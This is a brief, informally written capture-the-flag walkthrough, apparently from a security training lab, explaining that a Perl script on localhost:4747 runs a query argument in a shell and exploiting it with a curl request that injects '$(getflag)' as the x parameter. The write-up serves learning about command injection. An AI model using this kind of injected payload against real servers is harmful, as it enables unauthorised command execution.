1. There is an executable perl which can with code which run in a server (localhost:4747)
2. In this exe, you can se a fct call with one query qrguments (x)
3 use curl to call localhost:4747 with query arguments x='$(getflag)' to lauch getflag in a subshell

---------------------------------
curl localhost:4747/?x='$(getflag)'